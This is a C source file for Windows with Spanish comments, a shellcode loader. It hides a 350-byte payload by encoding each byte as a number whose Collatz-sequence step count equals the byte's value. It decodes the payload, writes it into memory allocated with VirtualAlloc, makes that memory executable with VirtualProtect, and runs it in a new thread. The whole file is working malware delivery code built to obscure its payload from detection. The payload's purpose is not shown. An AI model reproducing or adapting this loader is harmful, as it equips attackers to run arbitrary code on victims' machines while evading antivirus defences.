
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int array[256];

static int collatz(int c) {
	if (c % 2 == 0) { //si el numero input es par lo divide entre 2
		return c / 2;
	}
	return (c * 3) + 1; //si es impar lo multiplica por 3 y le suma 1

	return c;
}


static unsigned char decodeCollatz(int c) {
	int encoded = 0;
	if (c > 2) {
		while (c != 1) {
			c = collatz(c); //cuenta la cantidad de iteraciones de la conjetura de Collatz que genera el numero codificado para recuperar el byte original
			encoded++;
		}
		return encoded;
	}
	return c;
}

int main(void) {

	void* alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
	DWORD oldprotect = 0;

	unsigned short encodedPayload[] = {
		0x3d07,0x31f,0x391,0x2409,0x71e9,0x515e,0x515e,0x515e,0x5e1f,0x99f,0x0,
		0x0,0x0,0xfb,0x15e,0xfb,0xaf,0x2bc,0x15e,0x136,0x31f,
		0xa9,0x267c,0xd6,0x31f,0x2db,0x2bc,0xf2,0x3f2,0x31f,0x2db,
		0x2bc,0x31,0x3f2,0x31f,0x2db,0x2bc,0x39,0x3f2,0x31f,0x2db,
		0xd8,0xaf,0x3f2,0x31f,0x16,0x10fb,0x251,0x251,0x316,0xa9,
		0x1089,0x31f,0xa9,0x291c,0xabf,0x11b,0x1bf,0xab,0x2,0xb9,
		0x39,0xfb,0xdef,0x1089,0x22,0xfb,0x1,0xdef,0x3489,0xe7f,
		0x2bc,0xfb,0x15e,0x3f2,0x31f,0x2db,0x2bc,0x39,0x3f2,0x2db,
		0x1f6,0x11b,0x31f,0x1,0x99f,0x3f2,0x2db,0x1c9,0x21f,0x0,
		0x0,0x0,0x31f,0x19b,0x291c,0x91,0x1b,0x31f,0x1,0x99f,
		0xaf,0x3f2,0x2db,0x31f,0x31,0x3f2,0x14e,0x2db,0x2a1,0x39,
		0x129,0x1,0x99f,0x6912,0x5b,0x31f,0x515e,0x1089,0x3f2,0xfb,
		0x2db,0xdb,0x21f,0x31f,0x1,0x111b,0x316,0xa9,0x1089,0x31f,
		0xa9,0x291c,0xabf,0xfb,0xdef,0x1089,0x22,0xfb,0x1,0xdef,
		0x239,0x4ece,0x122,0x269f,0x3f2,0x18b,0x8,0x18b,0x99,0x6,
		0x6f,0x472,0x133e,0x122,0x111b,0xce,0x3f2,0x14e,0x2db,0x2a1,
		0x99,0x129,0x1,0x99f,0x47,0x3f2,0xfb,0x2db,0x11,0x31f,
		0x3f2,0x14e,0x2db,0x2a1,0x82,0x129,0x1,0x99f,0x3f2,0xfb,
		0x2db,0x10,0x21f,0x31f,0x1,0x99f,0xfb,0xce,0xfb,0xce,
		0x16c,0x19c,0x89,0xfb,0xce,0xfb,0x19c,0xfb,0x89,0x31f,
		0x261,0x2b7e,0x39,0xfb,0x2bc,0x515e,0x4ece,0xce,0xfb,0x19c,
		0x89,0x3f2,0x31f,0x2db,0x1c,0x209f,0x129,0x515e,0x515e,0x515e,
		0xb6,0x3f2,0x31f,0x1e7,0x1e7,0xde,0x1,0x0,0x0,0xfb,
		0x1721,0x18b,0xc1,0x69,0x3,0x515e,0x3351,0x129,0x18af,0xdef,
		0x2a1,0x0,0x0,0x0,0x3f2,0x31f,0x1e7,0xd56,0x10e,0x1,
		0x0,0x0,0x3f2,0x18b,0x1e7,0x19b,0x239,0x1,0x0,0x0,
		0x31f,0xa9,0x1089,0xfb,0x1721,0x6f,0x261,0x136,0x3,0x515e,
		0x3351,0x2d49,0x4ece,0x2b,0x10e,0x18,0xfb,0x1721,0x62f,0xd56,
		0x1ed6,0xfa9,0x515e,0x3351,0x31f,0x261,0x129b,0x196,0x11b,0xa,
		0xab,0x18,0x1c9,0x1f1b,0x4ece,0x122,0x5,0x2d49,0x1bc,0x9,
		0xd8,0x1b,0x1f,0x0,0x19c,0xfb,0x439,0x2d9c,0x515e,0x3351,
		0x31f,0x1b,0x7c,0x1bf,0x39,0x31f,0x1bf,0x142,0x3e,0x1bc,
		0x14e,0x18b,0x72,0x0,0x31f,0x1b,0x7c,0x1bf,0x39,0x31f,
		0x1bf,0x142,0x3e,0x1bc,0x14e,0x18b,0x72,0x0,0x122,0x49,
		0xd6,0xd8,0x281,0x149,0x7b,0x6b,0x7c,0x7c,0x0,0x0
	};

	unsigned char shellcodePayload[350];
	unsigned int lengthOfshellcodePayload = 350;

	for (int i = 0; i < sizeof(shellcodePayload); i++) {
		shellcodePayload[i] = decodeCollatz(encodedPayload[i]); // Decodificar payload
	}


	// Reservar memoria para shellcodePayload
	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copiar shellcodePayload a la memoria reservada
	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);

	// Definir como ejecutable la memoria reservada
	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);


	// Si VirtualProtect funciona, ejecutar el payload como un nuevo hilo
	if (retval != 0) {
		threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)alloc_mem, 0, 0, 0);
		WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
